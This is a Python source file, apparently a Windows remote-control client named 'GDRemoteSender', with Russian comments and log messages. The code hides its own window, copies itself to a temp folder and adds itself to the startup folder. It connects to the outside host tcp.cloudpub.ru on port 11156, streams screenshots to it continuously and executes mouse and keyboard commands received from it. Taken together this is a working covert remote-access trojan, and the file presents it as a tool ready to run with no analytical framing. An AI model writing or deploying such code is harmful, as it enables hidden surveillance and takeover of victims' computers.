import socket
import time
import mss
from PIL import Image
from io import BytesIO
import pyautogui
import threading
import dxcam
import os
import sys
import pythoncom
import win32com.client
import subprocess
import winshell
import logging
from typing import Optional
import shutil
import tempfile

# Настройка логирования
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('gd_remote.log'),
        logging.StreamHandler()
    ]
)


class Sender:
    def __init__(self):
        if getattr(sys, 'frozen', False):
            self._copy_to_temp()
        self.host = ("tcp.cloudpub.ru", 11156)
        self.camera = dxcam.create(output_idx=0, output_color="RGB")
        self.camera.start(target_fps=30)
        self.client = None
        self.connected = False

        # Инициализация автозагрузки
        self.init_autostart()

        self.connect_to_server()

        self.click_thread = threading.Thread(target=self.receive_clicks)
        self.click_thread.daemon = True
        self.click_thread.start()

    def init_autostart(self):
        """Инициализация автозагрузки с несколькими попытками"""
        max_attempts = 3
        for attempt in range(max_attempts):
            try:
                if not self.is_in_startup():
                    if self.add_to_startup():
                        logging.info("Успешно добавлено в автозагрузку")
                        break
                    else:
                        logging.warning(f"Не удалось добавить в автозагрузку (попытка {attempt + 1}/{max_attempts})")
                else:
                    logging.info("Программа уже в автозагрузке")
                    break
            except Exception as e:
                logging.error(f"Ошибка инициализации автозагрузки: {e}")

    def connect_to_server(self):
        """Подключение к серверу с повторными попытками"""
        while not self.connected:
            try:
                self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.client.settimeout(5)
                self.client.connect(self.host)
                self.connected = True
                logging.info("Подключение к серверу успешно")
            except (socket.timeout, ConnectionRefusedError, ConnectionAbortedError) as e:
                logging.warning(f"Ошибка подключения: {e}. Повтор через 2 секунды...")
                time.sleep(2)
            except Exception as e:
                logging.error(f"Неизвестная ошибка подключения: {e}")
                time.sleep(2)

    def screenshot(self) -> Optional[bytes]:
        """Захват скриншота с обработкой ошибок"""
        try:
            frame = self.camera.get_latest_frame()
            if frame is None:
                logging.warning("Не удалось захватить кадр (None returned)")
                return None

            with BytesIO() as buffer:
                Image.fromarray(frame).save(buffer, format="JPEG", quality=50)
                return buffer.getvalue()
        except Exception as e:
            logging.error(f"Ошибка захвата экрана: {e}")
            return None

    def send(self):
        """Основной цикл отправки данных"""
        while True:
            if not self.connected:
                self.connect_to_server()

            start_time = time.time()
            img_data = self.screenshot()

            if img_data:
                try:
                    self.client.sendall(img_data)
                    self.client.send(b'END')
                    logging.info(f"Отправлено изображение ({len(img_data)} байт)")
                except (ConnectionError, socket.error) as e:
                    logging.warning(f"Ошибка отправки: {e}")
                    self.connected = False
                    continue

            elapsed = time.time() - start_time
            time.sleep(max(0, 1 / 30 - elapsed))

    def handle_input(self, data):
        """Обработка входных данных от сервера"""
        parts = data.split(',')
        input_type = parts[0]

        try:
            if input_type == "mouse_click":
                x, y, button = int(parts[1]), int(parts[2]), parts[3]
                if button == 'left':
                    pyautogui.click(x, y)
                elif button == 'right':
                    pyautogui.click(x, y, button='right')
                elif button == 'middle':
                    pyautogui.click(x, y, button='middle')

            elif input_type == "mouse_double_click":
                x, y = int(parts[1]), int(parts[2])
                pyautogui.doubleClick(x, y)

            elif input_type == "mouse_drag":
                x, y = int(parts[1]), int(parts[2])
                pyautogui.dragTo(x, y, duration=0.1)

            elif input_type == "mouse_wheel":
                delta = int(parts[1])
                pyautogui.scroll(delta)

            elif input_type == "key_press":
                key_code, text = parts[1], parts[2]
                # Для обычных символов
                if text and text.isprintable():
                    pyautogui.press(text)
                else:
                    # Для специальных клавиш используем нашу маппингу
                    key_name = self._get_key_name(key_code)
                    if key_name:
                        pyautogui.press(key_name)

            elif input_type == "key_release":
                key_code = parts[1]
                key_name = self._get_key_name(key_code)
                if key_name:
                    pyautogui.keyUp(key_name)

        except Exception as e:
            logging.error(f"Ошибка обработки ввода: {e}")

    def _get_key_name(self, key_code):
        """Преобразование кода клавиши в имя для pyautogui"""
        key_map = {
            '16777248': 'shift',  # Qt.Key_Shift
            '16777249': 'ctrl',  # Qt.Key_Control
            '16777251': 'alt',  # Qt.Key_Alt
            '16777220': 'enter',  # Qt.Key_Enter
            '16777221': 'enter',  # Qt.Key_Return
            '16777216': 'escape',  # Qt.Key_Escape
            '16777219': 'backspace',  # Qt.Key_Backspace
            '16777217': 'tab',  # Qt.Key_Tab
            '32': 'space',  # Qt.Key_Space
            '16777234': 'left',  # Qt.Key_Left
            '16777235': 'up',  # Qt.Key_Up
            '16777236': 'right',  # Qt.Key_Right
            '16777237': 'down',  # Qt.Key_Down
            '16777223': 'delete',  # Qt.Key_Delete
            '16777222': 'insert',  # Qt.Key_Insert
            '16777232': 'f1',  # Qt.Key_F1
            '16777233': 'f2',  # Qt.Key_F2
            # Добавьте другие клавиши по необходимости
        }
        return key_map.get(key_code)

    def receive_clicks(self):
        """Обработка всех входных данных"""
        while True:
            if not self.connected:
                self.connect_to_server()

            try:
                data = self.client.recv(1024).decode()
                if data:
                    self.handle_input(data)
            except (ConnectionError, ValueError) as e:
                logging.warning(f"Ошибка получения данных: {e}")
                self.connected = False
            except Exception as e:
                logging.error(f"Неизвестная ошибка: {e}")

    def is_in_startup(self) -> bool:
        """Проверка наличия в автозагрузке"""
        try:
            # Проверка через планировщик задач
            scheduler = win32com.client.Dispatch('Schedule.Service')
            scheduler.Connect()
            tasks = scheduler.GetFolder('\\').GetTasks(0)

            for i in range(tasks.Count):
                if tasks.Item(i + 1).Name == "GDRemoteSender":
                    return True

            # Проверка через папку автозагрузки
            startup_path = winshell.startup()
            return os.path.exists(os.path.join(startup_path, "GDRemoteSender.lnk"))

        except Exception as e:
            logging.error(f"Ошибка проверки автозагрузки: {e}")
            return False

    def add_to_startup(self) -> bool:
        """Добавление в автозагрузку через ярлык"""
        try:
            exe_path = sys.executable if getattr(sys, 'frozen', False) else sys.argv[0]
            startup_path = winshell.startup()
            shortcut_path = os.path.join(startup_path, "GDRemoteSender.lnk")

            with winshell.shortcut(shortcut_path) as shortcut:
                shortcut.path = exe_path
                shortcut.working_directory = os.path.dirname(exe_path)
                shortcut.description = "GDRemoteSender Remote Control"
                if not getattr(sys, 'frozen', False):
                    shortcut.arguments = "--hidden"

            logging.info(f"Ярлык создан: {shortcut_path}")
            return True
        except Exception as e:
            logging.error(f"Ошибка создания ярлыка: {e}")
            return False

    def _copy_to_temp(self):
        """Копирует EXE в временную папку и перезапускает оттуда"""
        if hasattr(sys, '_MEIPASS'):  # Уже в временной папке
            return

        temp_dir = tempfile.mkdtemp(prefix='GDRemote_')
        exe_name = os.path.basename(sys.executable)
        temp_exe = os.path.join(temp_dir, exe_name)

        try:
            shutil.copy2(sys.executable, temp_exe)
            subprocess.Popen([temp_exe, *sys.argv[1:]])
            sys.exit(0)
        except Exception as e:
            print(f"Ошибка копирования EXE: {e}")
            shutil.rmtree(temp_dir, ignore_errors=True)


if __name__ == "__main__":
    try:
        if len(sys.argv) > 1 and sys.argv[1] == "--hidden":
            logging.info("Запуск в скрытом режиме")
            Sender().send()
        else:
            logging.info("Запуск с созданием ярлыка")
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW

            args = [sys.executable, "--hidden"] if getattr(sys, 'frozen', False) else [sys.executable, sys.argv[0],
                                                                                       "--hidden"]
            subprocess.Popen(args, startupinfo=startupinfo, creationflags=subprocess.CREATE_NO_WINDOW)
    except Exception as e:
        logging.critical(f"Критическая ошибка: {e}")